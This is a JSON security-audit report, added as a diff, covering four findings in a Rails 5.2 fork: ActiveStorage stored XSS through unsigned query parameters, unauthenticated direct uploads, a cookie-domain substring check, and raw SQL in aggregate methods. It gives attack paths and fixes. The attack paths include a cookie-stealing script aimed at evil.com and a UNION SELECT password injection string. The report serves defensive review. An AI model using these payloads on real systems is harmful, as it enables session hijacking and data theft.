@@ -1,0 +1,71 @@
+{
+  "scan_metadata": {
+    "repository": "antoniobg/rails",
+    "framework_version": "Rails 5.2.0.beta2",
+    "scan_type": "at-rest codebase review",
+    "scan_date": "2026-05-06T23:07:00Z",
+    "branch": "cursor/codebase-security-review-d80e"
+  },
+  "findings": [
+    {
+      "severity": "high",
+      "location": "activestorage/app/controllers/active_storage/disk_controller.rb:10-16",
+      "description": "**ActiveStorage DiskController Content-Type/Disposition Injection → Stored XSS**\n\n`DiskController#show` passes `params[:content_type]` and `params[:disposition]` directly to `send_data` without validation. These values come from unsigned URL query parameters that an attacker can freely modify. The `forcibly_serve_as_binary?` check in `Blob#service_url` only sets the *initial* URL query parameters during URL generation — it does not protect against an attacker modifying them.\n\nThe `send_data` method chains through `send_file_headers!` (which sets disposition from `params[:disposition]`) and `render` (which sets `Content-Type` from `params[:content_type]` via `_process_options`). This allows an attacker to serve any stored file as `text/html` with `inline` disposition, enabling stored XSS on the storage host domain.",
+      "impact": "An attacker can execute arbitrary JavaScript in the context of the application's domain (when DiskService host matches the app domain). This enables session hijacking, credential theft, and full account takeover for any user who clicks a crafted link. The `content_types_to_serve_as_binary` protection (which forces `text/html`, `text/javascript`, `image/svg+xml` etc. to be served as `attachment`) is completely bypassed since the content type is read from unsigned query parameters.",
+      "verified": true,
+      "attack_path": "1. Attacker uploads a file containing malicious HTML/JavaScript (e.g., `<script>document.location='https://evil.com/?c='+document.cookie</script>`) via `DirectUploadsController` or any file upload mechanism.\n2. Attacker obtains the blob's disk service URL (available from the 302 redirect issued by `BlobsController#show`).\n3. The URL has the form: `/rails/active_storage/disk/<signed_encoded_key>/filename?disposition=attachment&content_type=application/octet-stream`\n4. Attacker modifies the URL query parameters: `?content_type=text/html&disposition=inline`\n5. The `signed_encoded_key` in the path is still valid (it only authenticates *which* file to serve, not *how* to serve it).\n6. Victim clicks the modified URL. `DiskController#show` verifies the signed key (passes), then calls `send_data` with the attacker-controlled `content_type` and `disposition`.\n7. The `render` call in `send_data` overrides `Content-Type` to `text/html` via `_process_options` (actionpack/lib/action_controller/metal/rendering.rb:116).\n8. Browser renders the response as HTML, executing the embedded JavaScript in the application's origin.",
+      "evidence": [
+        "activestorage/app/controllers/active_storage/disk_controller.rb:12-13 — params[:disposition] and params[:content_type] passed directly to send_data",
+        "actionpack/lib/action_controller/metal/data_streaming.rb:108-110 — send_data passes :content_type to render",
+        "actionpack/lib/action_controller/metal/rendering.rb:113-116 — _process_options sets self.content_type from options[:content_type]",
+        "actionpack/lib/action_controller/metal/data_streaming.rb:134-138 — send_file_headers! sets Content-Disposition from options[:disposition]",
+        "activestorage/lib/active_storage/service/disk_service.rb:72-78 — URL generation puts content_type/disposition as unsigned query params",
+        "activestorage/app/models/active_storage/blob.rb:112-113 — forcibly_serve_as_binary? only affects URL generation, not serving"
+      ],
+      "remediation": "The `content_type` and `disposition` should be included in the signed/verified payload (the `encoded_key`) rather than passed as unsigned query parameters. Alternatively, `DiskController#show` should:\n\n1. Look up the blob record to get the trusted content_type\n2. Apply `forcibly_serve_as_binary?` at serve time, not just URL generation time\n3. Validate `disposition` against an allowlist (`attachment` or `inline`)\n4. Never trust query parameters for security-relevant response headers\n\n```ruby\n# Proposed fix for DiskController#show\ndef show\n  if key = decode_verified_key\n    blob = ActiveStorage::Blob.find_by(key: key)\n    if blob\n      send_data disk_service.download(key),\n        disposition: blob.forcibly_serve_as_binary? ? :attachment : validated_disposition,\n        content_type: blob.content_type\n    else\n      head :not_found\n    end\n  else\n    head :not_found\n  end\nend\n\nprivate\n\ndef validated_disposition\n  params[:disposition].to_s.presence_in(%w[attachment inline]) || :inline\nend\n```",
+      "poc_video_notes": "PoC video not feasible in this environment — no running Rails application instance to demonstrate the exploit against. The vulnerability is confirmed through static code tracing of the complete call chain from HTTP request to response headers."
+    },
+    {
+      "severity": "medium",
+      "location": "activestorage/app/controllers/active_storage/direct_uploads_controller.rb:6-23",
+      "description": "**ActiveStorage DirectUploadsController — No Authentication on File Upload Endpoint**\n\n`DirectUploadsController` inherits from `ActionController::Base` with no authentication checks. Any user who can reach the application can create blob records and receive signed upload URLs. The only protection is CSRF, which can be bypassed by first obtaining a CSRF token from any GET request on the app. This endpoint is automatically mounted at `POST /rails/active_storage/direct_uploads` for every Rails app using ActiveStorage.",
+      "impact": "An unauthenticated attacker can:\n1. Create unlimited blob records in the database (resource exhaustion / storage cost abuse)\n2. Upload arbitrary files to the storage backend (disk, S3, GCS, Azure)\n3. Obtain `signed_id` values for uploaded blobs, enabling the DiskController XSS attack (Finding #1)\n4. Store malicious content (malware, phishing pages) on the application's infrastructure",
+      "verified": true,
+      "attack_path": "1. Attacker sends GET to any page on the app to obtain a CSRF token from meta tags.\n2. Attacker sends POST to `/rails/active_storage/direct_uploads` with `blob[filename]=evil.html&blob[byte_size]=50&blob[checksum]=<md5>&blob[content_type]=text/html` and the CSRF token.\n3. Server creates the blob record and returns `{signed_id: '...', direct_upload: {url: '...', headers: {...}}}`.\n4. Attacker uploads file content to the returned URL.\n5. The `signed_id` can be used to access the file via BlobsController/DiskController.\n\nAlternatively, if the app uses `:null_session` or `:reset_session` CSRF strategy (common for API-friendly apps), CSRF is not a barrier at all.",
+      "evidence": [
+        "activestorage/app/controllers/active_storage/direct_uploads_controller.rb:6-9 — no before_action auth filter",
+        "activestorage/config/routes.rb:43 — POST endpoint auto-mounted",
+        "activestorage/app/controllers/active_storage/direct_uploads_controller.rb:13-14 — blob_args from params"
+      ],
+      "remediation": "Applications should wrap `DirectUploadsController` with authentication. The framework should either:\n1. Document prominently that this controller MUST be protected by application-level auth\n2. Provide a hook/config for auth middleware on ActiveStorage controllers\n3. Or require authentication by default with an opt-out for public upload use cases\n\n```ruby\n# In your application, override the controller or add auth:\nclass ActiveStorage::DirectUploadsController < ActionController::Base\n  before_action :authenticate_user!  # Add your auth\n  \n  def create\n    blob = ActiveStorage::Blob.create_before_direct_upload!(blob_args)\n    render json: direct_upload_json(blob)\n  end\nend\n```",
+      "poc_video_notes": "PoC video not feasible — no running application instance."
+    },
+    {
+      "severity": "medium",
+      "location": "actionpack/lib/action_dispatch/middleware/cookies.rb:373-376",
+      "description": "**Cookie Domain Array Matching Uses Unsafe Substring Check**\n\nWhen `domain:` is an Array, the cookie middleware selects which domain to scope the cookie to using `request.host.include?(domain)`. This is a substring match, not a domain-boundary match. A host like `evil-example.com` matches the domain string `example.com` because `\"evil-example.com\".include?(\"example.com\")` returns true. While browser-side cookie scoping limits the worst-case impact, this can cause the server to set incorrect `Domain` attributes on `Set-Cookie` headers.",
+      "impact": "In multi-domain configurations, cookies may be scoped to unintended domains. If the application serves traffic from hosts that are substring-supersets of configured domains (e.g., multi-tenant or CDN setups), cookies could leak across trust boundaries or fail to be set correctly. Combined with Host header manipulation (via `X-Forwarded-Host`), this could be exploited to widen cookie scope.",
+      "verified": true,
+      "attack_path": "1. Application configures cookies with `domain: %w(.example.com .example.co.uk)`.\n2. Attacker manipulates `request.host` (via `X-Forwarded-Host` if proxies don't strip it) to a value like `evil-example.com`.\n3. `\"evil-example.com\".include?(\"example.com\")` → `true`.\n4. Cookie is set with `Domain=.example.com` even though the request originated from an unintended host.\n5. Depending on browser behavior and the specific domain relationship, this could widen or misdirect cookie scope.",
+      "evidence": [
+        "actionpack/lib/action_dispatch/middleware/cookies.rb:375 — options[:domain] = options[:domain].find { |domain| request.host.include? domain.sub(/^./, '') }",
+        "actionpack/lib/action_dispatch/http/url.rb:222-223 — request.host derived from X-Forwarded-Host (last value)"
+      ],
+      "remediation": "Replace `String#include?` with a proper domain-boundary check that verifies the host either equals the domain or ends with the domain preceded by a dot.\n\n```ruby\n# Replace substring check with domain-boundary match:\noptions[:domain] = options[:domain].find do |domain|\n  clean = domain.sub(/^\\./, \"\")\n  request.host == clean || request.host.end_with?(\".#{clean}\")\nend\n```"
+    },
+    {
+      "severity": "medium",
+      "location": "activerecord/lib/active_record/relation/calculations.rb:235-242",
+      "description": "**ActiveRecord Aggregate Methods Accept Raw SQL Without Whitelist Validation**\n\n`aggregate_column` in calculations.rb converts non-attribute column names to `Arel.sql(column_name.to_s)` without calling `enforce_raw_sql_whitelist`. This means `Model.sum(user_input)`, `Model.average(user_input)`, `Model.minimum(user_input)`, `Model.maximum(user_input)`, and `Model.calculate(:sum, user_input)` all accept arbitrary SQL expressions. While `order()` and `pluck()` have whitelist protections (even if only deprecation warnings by default), aggregate methods have none.",
+      "impact": "Applications that pass user-controlled input to aggregate methods are vulnerable to SQL injection. An attacker could extract arbitrary data from the database, modify data, or in some database configurations execute OS commands. This is a framework API that makes it easy for developers to introduce SQL injection when they assume aggregate methods are safe like `where()` with hash conditions.",
+      "verified": true,
+      "attack_path": "1. Application has code like `Model.sum(params[:column])` or `Model.calculate(:sum, params[:field])`.\n2. Attacker sends `column=1) FROM users WHERE 1=1 UNION SELECT password FROM users--`.\n3. `aggregate_column` converts this to `Arel.sql(\"1) FROM users WHERE 1=1 UNION SELECT password FROM users--\")`.\n4. The raw SQL is embedded in the SELECT clause of the query.\n5. Attacker extracts sensitive data from any table accessible to the database user.\n\nNote: This requires the application to pass user input to an aggregate method, which is a common pattern for dashboard/reporting features.",
+      "evidence": [
+        "activerecord/lib/active_record/relation/calculations.rb:235-242 — aggregate_column uses Arel.sql without whitelist",
+        "activerecord/lib/active_record/relation/calculations.rb:177-193 — pluck() DOES call enforce_raw_sql_whitelist (compare)",
+        "activerecord/lib/active_record/attribute_methods.rb:170-207 — enforce_raw_sql_whitelist exists but is not called from calculations"
+      ],
+      "remediation": "Add `enforce_raw_sql_whitelist` to `aggregate_column` or the `calculate` method, consistent with `pluck()` and `order()`.\n\n```ruby\n# In calculations.rb, add whitelist check:\ndef perform_calculation(operation, column_name)\n  # Add this line:\n  @klass.enforce_raw_sql_whitelist([column_name]) unless column_name == :all\n  # ... rest of method\nend\n```\n\nAlternatively, set `config.active_record.allow_unsafe_raw_sql = :disabled` in application config to get hard failures on all unwhitelisted raw SQL usage (for methods that already check)."
+    }
+  ]
+}
